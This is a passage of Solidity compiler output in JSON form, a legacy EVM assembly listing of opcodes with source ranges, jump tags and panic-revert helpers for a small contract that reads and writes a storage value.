											"source": 0
										},
										{
											"begin": 635,
											"end": 652,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 635,
											"end": 652,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 635,
											"end": 652,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 635,
											"end": 652,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 635,
											"end": 652,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 635,
											"end": 652,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 635,
											"end": 652,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 635,
											"end": 652,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 635,
											"end": 652,
											"name": "tag",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 635,
											"end": 652,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 635,
											"end": 652,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 635,
											"end": 652,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 635,
											"end": 652,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 635,
											"end": 652,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 635,
											"end": 652,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 668,
											"end": 672,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 661,
											"end": 672,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 661,
											"end": 672,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 661,
											"end": 672,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 661,
											"end": 672,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 661,
											"end": 672,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 661,
											"end": 672,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 661,
											"end": 672,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 606,
											"end": 743,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 606,
											"end": 743,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 713,
											"end": 714,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 695,
											"end": 710,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 695,
											"end": 714,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 695,
											"end": 714,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 695,
											"end": 714,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 695,
											"end": 714,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 730,
											"end": 735,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 723,
											"end": 735,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 723,
											"end": 735,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 723,
											"end": 735,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 723,
											"end": 735,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 723,
											"end": 735,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 303,
											"end": 748,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 303,
											"end": 748,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 303,
											"end": 748,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 303,
											"end": 748,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 303,
											"end": 748,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 303,
											"end": 748,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 87,
											"end": 117,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 87,
											"end": 117,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 87,
											"end": 117,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 87,
											"end": 117,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 87,
											"end": 117,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 87,
											"end": 117,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 7,
											"end": 140,
											"name": "tag",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 7,
											"end": 140,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 7,
											"end": 140,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 88,
											"end": 94,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 75,
											"end": 95,
											"name": "CALLDATALOAD",
											"source": 2
										},
										{
											"begin": 66,
											"end": 95,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 66,
											"end": 95,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 104,
											"end": 134,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "30"
										},
										{
											"begin": 128,
											"end": 133,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 104,
											"end": 134,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "31"
										},
										{
											"begin": 104,
											"end": 134,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 104,
											"end": 134,
											"name": "tag",
											"source": 2,
											"value": "30"
										},
										{
											"begin": 104,
											"end": 134,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 56,
											"end": 140,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 56,
											"end": 140,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 56,
											"end": 140,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 56,
											"end": 140,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 56,
											"end": 140,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 146,
											"end": 402,
											"name": "tag",
											"source": 2,
											"value": "7"
										},
										{
											"begin": 146,
											"end": 402,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 146,
											"end": 402,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 251,
											"end": 253,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 239,
											"end": 248,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 230,
											"end": 237,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 226,
											"end": 249,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 222,
											"end": 254,
											"name": "SLT",
											"source": 2
										},
										{
											"begin": 219,
											"end": 221,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 219,
											"end": 221,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "33"
										},
										{
											"begin": 219,
											"end": 221,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 267,
											"end": 268,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 264,
											"end": 265,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 257,
											"end": 269,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 219,
											"end": 221,
											"name": "tag",
											"source": 2,
											"value": "33"
										},
										{
											"begin": 219,
											"end": 221,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 310,
											"end": 311,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 335,
											"end": 385,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 377,
											"end": 384,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 368,
											"end": 374,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 357,
											"end": 366,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 353,
											"end": 375,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 335,
											"end": 385,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 335,
											"end": 385,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 335,
											"end": 385,
											"name": "tag",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 335,
											"end": 385,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 325,
											"end": 385,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 325,
											"end": 385,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 281,
											"end": 395,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 209,
											"end": 402,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 209,
											"end": 402,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 209,
											"end": 402,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 209,
											"end": 402,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 209,
											"end": 402,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 408,
											"end": 517,
											"name": "tag",
											"source": 2,
											"value": "35"
										},
										{
											"begin": 408,
											"end": 517,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 489,
											"end": 510,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "37"
										},
										{
											"begin": 504,
											"end": 509,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 489,
											"end": 510,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "38"
										},
										{
											"begin": 489,
											"end": 510,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 489,
											"end": 510,
											"name": "tag",
											"source": 2,
											"value": "37"
										},
										{
											"begin": 489,
											"end": 510,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 484,
											"end": 487,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 477,
											"end": 511,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 467,
											"end": 517,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 467,
											"end": 517,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 467,
											"end": 517,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 523,
											"end": 641,
											"name": "tag",
											"source": 2,
											"value": "39"
										},
										{
											"begin": 523,
											"end": 641,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 610,
											"end": 634,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "41"
										},
										{
											"begin": 628,
											"end": 633,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 610,
											"end": 634,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 610,
											"end": 634,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 610,
											"end": 634,
											"name": "tag",
											"source": 2,
											"value": "41"
										},
										{
											"begin": 610,
											"end": 634,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 605,
											"end": 608,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 598,
											"end": 635,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 588,
											"end": 641,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 588,
											"end": 641,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 588,
											"end": 641,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 647,
											"end": 857,
											"name": "tag",
											"source": 2,
											"value": "10"
										},
										{
											"begin": 647,
											"end": 857,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 647,
											"end": 857,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 772,
											"end": 774,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 761,
											"end": 770,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 757,
											"end": 775,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 749,
											"end": 775,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 749,
											"end": 775,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 785,
											"end": 850,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "44"
										},
										{
											"begin": 847,
											"end": 848,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 836,
											"end": 845,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 832,
											"end": 849,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 823,
											"end": 829,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 785,
											"end": 850,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "35"
										},
										{
											"begin": 785,
											"end": 850,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 785,
											"end": 850,
											"name": "tag",
											"source": 2,
											"value": "44"
										},
										{
											"begin": 785,
											"end": 850,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 739,
											"end": 857,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 739,
											"end": 857,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 739,
											"end": 857,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 739,
											"end": 857,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 739,
											"end": 857,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 863,
											"end": 1085,
											"name": "tag",
											"source": 2,
											"value": "14"
										},
										{
											"begin": 863,
											"end": 1085,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 863,
											"end": 1085,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 994,
											"end": 996,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 983,
											"end": 992,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 979,
											"end": 997,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 971,
											"end": 997,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 971,
											"end": 997,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1007,
											"end": 1078,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "46"
										},
										{
											"begin": 1075,
											"end": 1076,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1064,
											"end": 1073,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1060,
											"end": 1077,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1051,
											"end": 1057,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 1007,
											"end": 1078,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "39"
										},
										{
											"begin": 1007,
											"end": 1078,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1007,
											"end": 1078,
											"name": "tag",
											"source": 2,
											"value": "46"
										},
										{
											"begin": 1007,
											"end": 1078,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 961,
											"end": 1085,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 961,
											"end": 1085,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 961,
											"end": 1085,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 961,
											"end": 1085,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 961,
											"end": 1085,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1091,
											"end": 1276,
											"name": "tag",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 1091,
											"end": 1276,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1091,
											"end": 1276,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1148,
											"end": 1168,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "48"
										},
										{
											"begin": 1166,
											"end": 1167,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1148,
											"end": 1168,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 1148,
											"end": 1168,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1148,
											"end": 1168,
											"name": "tag",
											"source": 2,
											"value": "48"
										},
										{
											"begin": 1148,
											"end": 1168,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1143,
											"end": 1168,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1143,
											"end": 1168,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1182,
											"end": 1202,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "49"
										},
										{
											"begin": 1200,
											"end": 1201,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1182,
											"end": 1202,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 1182,
											"end": 1202,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1182,
											"end": 1202,
											"name": "tag",
											"source": 2,
											"value": "49"
										},
										{
											"begin": 1182,
											"end": 1202,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1177,
											"end": 1202,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1177,
											"end": 1202,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1221,
											"end": 1222,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1211,
											"end": 1213,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "50"
										},
										{
											"begin": 1211,
											"end": 1213,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 1226,
											"end": 1244,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "51"
										},
										{
											"begin": 1226,
											"end": 1244,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "52"
										},
										{
											"begin": 1226,
											"end": 1244,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1226,
											"end": 1244,
											"name": "tag",
											"source": 2,
											"value": "51"
										},
										{
											"begin": 1226,
											"end": 1244,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1211,
											"end": 1213,
											"name": "tag",
											"source": 2,
											"value": "50"
										},
										{
											"begin": 1211,
											"end": 1213,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1268,
											"end": 1269,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1265,
											"end": 1266,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1261,
											"end": 1270,
											"name": "DIV",
											"source": 2
										},
										{
											"begin": 1256,
											"end": 1270,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1256,
											"end": 1270,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1133,
											"end": 1276,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1133,
											"end": 1276,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1133,
											"end": 1276,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1133,
											"end": 1276,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1133,
											"end": 1276,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1282,
											"end": 1473,
											"name": "tag",
											"source": 2,
											"value": "17"
										},
										{
											"begin": 1282,
											"end": 1473,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1282,
											"end": 1473,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1342,
											"end": 1362,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "54"
										},
										{
											"begin": 1360,
											"end": 1361,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1342,
											"end": 1362,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 1342,
											"end": 1362,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1342,
											"end": 1362,
											"name": "tag",
											"source": 2,
											"value": "54"
										},
										{
											"begin": 1342,
											"end": 1362,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1337,
											"end": 1362,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1337,
											"end": 1362,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1376,
											"end": 1396,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "55"
										},
										{
											"begin": 1394,
											"end": 1395,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1376,
											"end": 1396,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 1376,
											"end": 1396,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1376,
											"end": 1396,
											"name": "tag",
											"source": 2,
											"value": "55"
										},
										{
											"begin": 1376,
											"end": 1396,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1371,
											"end": 1396,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1371,
											"end": 1396,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1415,
											"end": 1416,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1412,
											"end": 1413,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1409,
											"end": 1417,
											"name": "LT",
											"source": 2
										},
										{
											"begin": 1406,
											"end": 1408,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 1406,
											"end": 1408,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "56"
										},
										{
											"begin": 1406,
											"end": 1408,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 1420,
											"end": 1438,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "57"
										},
										{
											"begin": 1420,
											"end": 1438,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "58"
										},
										{
											"begin": 1420,
											"end": 1438,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1420,
											"end": 1438,
											"name": "tag",
											"source": 2,
											"value": "57"
										},
										{
											"begin": 1420,
											"end": 1438,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1406,
											"end": 1408,
											"name": "tag",
											"source": 2,
											"value": "56"
										},
										{
											"begin": 1406,
											"end": 1408,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1465,
											"end": 1466,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1462,
											"end": 1463,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1458,
											"end": 1467,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 1450,
											"end": 1467,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1450,
											"end": 1467,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1327,
											"end": 1473,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1327,
											"end": 1473,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1327,
											"end": 1473,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1327,
											"end": 1473,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1327,
											"end": 1473,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1479,
											"end": 1569,
											"name": "tag",
											"source": 2,
											"value": "38"
										},
										{
											"begin": 1479,
											"end": 1569,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1479,
											"end": 1569,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1556,
											"end": 1561,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1549,
											"end": 1562,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 1542,
											"end": 1563,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 1531,
											"end": 1563,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1531,
											"end": 1563,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1521,
											"end": 1569,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1521,
											"end": 1569,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1521,
											"end": 1569,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1521,
											"end": 1569,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1575,
											"end": 1652,
											"name": "tag",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 1575,
											"end": 1652,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1575,
											"end": 1652,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1641,
											"end": 1646,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1630,
											"end": 1646,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1630,
											"end": 1646,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1620,
											"end": 1652,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1620,
											"end": 1652,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1620,
											"end": 1652,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1620,
											"end": 1652,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1658,
											"end": 1891,
											"name": "tag",
											"source": 2,
											"value": "25"
										},
										{
											"begin": 1658,
											"end": 1891,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1658,
											"end": 1891,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1720,
											"end": 1744,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "62"
										},
										{
											"begin": 1738,
											"end": 1743,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1720,
											"end": 1744,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 1720,
											"end": 1744,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1720,
											"end": 1744,
											"name": "tag",
											"source": 2,
											"value": "62"
										},
										{
											"begin": 1720,
											"end": 1744,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1711,
											"end": 1744,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1711,
											"end": 1744,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1766,
											"end": 1832,
											"name": "PUSH",
											"source": 2,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1759,
											"end": 1764,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1756,
											"end": 1833,
											"name": "EQ",
											"source": 2
										},
										{
											"begin": 1753,
											"end": 1755,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 1753,
											"end": 1755,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "63"
										},
										{
											"begin": 1753,
											"end": 1755,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 1836,
											"end": 1854,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "64"
										},
										{
											"begin": 1836,
											"end": 1854,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "58"
										},
										{
											"begin": 1836,
											"end": 1854,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1836,
											"end": 1854,
											"name": "tag",
											"source": 2,
											"value": "64"
										},
										{
											"begin": 1836,
											"end": 1854,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1753,
											"end": 1755,
											"name": "tag",
											"source": 2,
											"value": "63"
										},
										{
											"begin": 1753,
											"end": 1755,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1883,
											"end": 1884,
											"name": "PUSH",
											"source": 2,
											"value": "1"
										},
										{
											"begin": 1876,
											"end": 1881,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1872,
											"end": 1885,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1865,
											"end": 1885,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1865,
											"end": 1885,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1701,
											"end": 1891,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1701,
											"end": 1891,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1701,
											"end": 1891,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1701,
											"end": 1891,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1897,
											"end": 2077,
											"name": "tag",
											"source": 2,
											"value": "58"
										},
										{
											"begin": 1897,
											"end": 2077,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1945,
											"end": 2022,
											"name": "PUSH",
											"source": 2,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1942,
											"end": 1943,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1935,
											"end": 2023,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 2042,
											"end": 2046,
											"name": "PUSH",
											"source": 2,
											"value": "11"
										},
										{
											"begin": 2039,
											"end": 2040,
											"name": "PUSH",
											"source": 2,
											"value": "4"
										},
										{
											"begin": 2032,
											"end": 2047,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 2066,
											"end": 2070,
											"name": "PUSH",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 2063,
											"end": 2064,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2056,
											"end": 2071,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 2083,
											"end": 2263,
											"name": "tag",
											"source": 2,
											"value": "52"
										},
										{
											"begin": 2083,
											"end": 2263,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2131,
											"end": 2208,
											"name": "PUSH",
											"source": 2,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 2128,
											"end": 2129,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
